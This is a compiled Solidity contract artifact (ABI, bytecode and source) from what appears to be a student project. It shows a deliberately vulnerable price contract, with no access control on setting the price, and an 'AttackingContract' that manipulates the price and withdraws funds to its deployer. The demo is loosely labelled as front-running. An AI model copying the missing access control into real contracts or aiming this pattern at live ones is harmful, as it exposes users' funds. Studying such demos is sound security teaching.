{
  "contractName": "AttackingContract",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_priceManipulationContract",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "priceSent",
          "type": "uint256"
        }
      ],
      "name": "Exploitation",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "exploiter",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "frontRunningContract",
      "outputs": [
        {
          "internalType": "contract FrontRunningContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_price",
          "type": "uint256"
        }
      ],
      "name": "exploit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516107463803806107468339818101604052810190610032919061011c565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b6105ee806101586000396000f3fe60806040526004361061003f5760003560e01c80633ccfd60b1461004457806358f69e071461005b578063879770f414610077578063e82aa271146100a2575b600080fd5b34801561005057600080fd5b506100596100cd565b005b610075600480360381019061007091906103ab565b6101c8565b005b34801561008357600080fd5b5061008c610326565b6040516100999190610419565b60405180910390f35b3480156100ae57600080fd5b506100b761034c565b6040516100c49190610493565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461015d576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101549061050b565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101c5573d6000803e3d6000fd5b50565b7fce98b6104e21fc3a9fcf266a4f60105f34d977d200736d3541b397fad50fc66e816040516101f7919061053a565b60405180910390a160008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166359b118b06001836102489190610584565b6040518263ffffffff1660e01b8152600401610264919061053a565b600060405180830381600087803b15801561027e57600080fd5b505af1158015610292573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166364edfbf06001836102df9190610584565b6040518263ffffffff1660e01b81526004016000604051808303818588803b15801561030a57600080fd5b505af115801561031e573d6000803e3d6000fd5b505050505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b6000819050919050565b61038881610375565b811461039357600080fd5b50565b6000813590506103a58161037f565b92915050565b6000602082840312156103c1576103c0610370565b5b60006103cf84828501610396565b91505092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610403826103d8565b9050919050565b610413816103f8565b82525050565b600060208201905061042e600083018461040a565b92915050565b6000819050919050565b600061045961045461044f846103d8565b610434565b6103d8565b9050919050565b600061046b8261043e565b9050919050565b600061047d82610460565b9050919050565b61048d81610472565b82525050565b60006020820190506104a86000830184610484565b92915050565b600082825260208201905092915050565b7f4f6e6c7920746865206578706c6f697465722063616e20776974686472617700600082015250565b60006104f5601f836104ae565b9150610500826104bf565b602082019050919050565b60006020820190508181036000830152610524816104e8565b9050919050565b61053481610375565b82525050565b600060208201905061054f600083018461052b565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061058f82610375565b915061059a83610375565b92508282019050808211156105b2576105b1610555565b5b9291505056fea264697066735822122095901291fa7327e751e203de83855b4b7bc85d58b5cfcc1c61efe2ef5de1403c64736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.19;\r\n\r\ncontract FrontRunningContract {\r\n\r\n uint256 public manipulatedPrice;\r\n    event PriceManipulated(uint256 newPrice); //event triggered upon price manipulation\r\n    event Purchase(address buyer, uint256 amount); //event triggered after a purchase\r\n    function manipulatePrice(uint256 _price) external {\r\n        manipulatedPrice = _price; //update current price with manipulated\r\n        emit PriceManipulated(_price); //emit manipulated price\r\n    }\r\n\r\n    function purchase() external payable {\r\n        require(msg.value == manipulatedPrice, \"Must send exactly the manipulated price\");\r\n    emit Purchase(msg.sender, msg.value); //emit purchaser address and amount\r\n    }\r\n}\r\n\r\ncontract AttackingContract {\r\n    \r\nFrontRunningContract public frontRunningContract;\r\n    address public exploiter;\r\n    event Exploitation(uint256 priceSent); //triggered if exploit detected\r\n\r\n    constructor(address _priceManipulationContract) {\r\n        frontRunningContract = FrontRunningContract(_priceManipulationContract); //Initialising the vulnerable contract variable with corresponding address\r\n        exploiter = msg.sender; //set exploiter as contract owner\r\n    }\r\n\r\n    function exploit(uint256 _price) external payable { //payable to take Ether\r\n        emit Exploitation(_price); //emit exploitation with price provided \r\n        frontRunningContract.manipulatePrice(_price + 1); //price manipulation\r\n        frontRunningContract.purchase{value: _price + 1}(); //purchase with manipulated price\r\n    }\r\n\r\n    function withdraw() external {\r\n        require(msg.sender == exploiter, \"Only the exploiter can withdraw\");\r\n        payable(exploiter).transfer(address(this).balance); //transfer contract balance to attacker\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Individual Project\\Smart Contracts\\contracts\\FrontRunning.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-22T17:37:36.491Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}